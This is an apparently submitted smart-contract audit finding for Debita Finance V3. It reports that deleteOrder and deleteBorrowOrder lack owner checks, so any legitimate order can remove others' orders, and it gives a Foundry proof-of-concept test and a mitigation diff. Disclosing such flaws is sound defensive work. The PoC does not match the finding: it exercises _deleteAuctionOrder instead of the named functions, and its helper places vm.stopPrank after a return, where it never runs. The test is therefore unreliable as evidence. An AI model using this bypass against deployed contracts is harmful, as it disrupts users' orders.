# denial of service through deleteOrder( ) and deleteBorrowOrder ( )

### Summary

Anyone can call the functions [deleteOrder](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/DebitaLendOfferFactory.sol#L207) and [deleteBorrowOrder](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/DebitaBorrowOffer-Factory.sol#L162 ) to delete an order by becoming either `isLendOrderLegit` or `isBorrowOrderLegit` respectively, as that is what is required when calling the functions. However, once anyone becomes legit, they are able to delete any active orders by specifying the order address.

A malicious lender or borrower could deny another legit user of returning the correct data when calling either `getActiveOrders` or `getActiveBorrowOrders` to get active orders.  

Active orders could be queried and displayed on the front end, however, they can be removed by a malicious actor. 



### Root Cause

The functions mentioned above do not check if the caller (legit borrower or lender ) is the owner of the order that is about to be deleted. 

### Internal pre-conditions

Malicous actor needs to  become either `isLendOrderLegit` or `isBorrowOrderLegit`  by creating an order .
 

### External pre-conditions

_No response_

### Attack Path

Call the functions with order address

### Impact

A malicious lender or borrower could deny another legit user of returning the correct data when calling either `getActiveOrders` or `getActiveBorrowOrders` to get active orders.  

### PoC

Paste the Helper function and  test  below in  `test/fork/Auctions`

Helper function :
```solidity
   function createAuctionInternal(
        uint initAmount,
        uint floorAmount,
        uint timelapse,
        address _signer
    ) internal returns (address) {
     vm.startPrank(_signer);
        deal(AERO, _signer, 1000e18, false);
        ERC20Mock(AERO).approve(address(ABIERC721Contract), 1000e18);
        uint id = ABIERC721Contract.createLock(100e18, 365 * 4 * 86400);
        ABIERC721Contract.approve(address(factory), id);
        address _auction = factory.createAuction(
            id,
            veAERO,
            AERO,
            initAmount,
            floorAmount,
            timelapse
        );
        return _auction;
        vm.stopPrank();
    }
}
```

Test  : 
 ```solidity
function test_Unauthorized_Deletion() public {
    // first user 
    address auction1 = createAuctionInternal(300e18, 15e18, 106400, signer);
    assertEq(factory.AuctionOrderIndex(auction1), 1);

    // second user
    address auction2 = createAuctionInternal(300e18, 15e18, 106400, secondSigner);
    assertEq(factory.AuctionOrderIndex(auction2), 2);

    vm.stopPrank();
// this should not be allowed
    vm.prank(address(auction1));
    factory._deleteAuctionOrder(auction2);

    assertEq(factory.AuctionOrderIndex(auction2), 0);

 
    vm.stopPrank();




}

```
run 
```console
forge test --fork-url http://localhost:8545 --mt test_Unauthorized_Deletion
```

### Mitigation

In `deleteBorrowOrder`

```diff
    function deleteBorrowOrder(address _borrowOrder) external onlyBorrowOrder {
+       require(msg.sender == _borrowOrder, "Only borrow order");
...
  }   
```

And in `deleteOrder`

```diff
  function deleteOrder(address _lendOrder) external onlyLendOrder {
+        require(msg.sender == _lendOrder, "Only lend order");
      
```
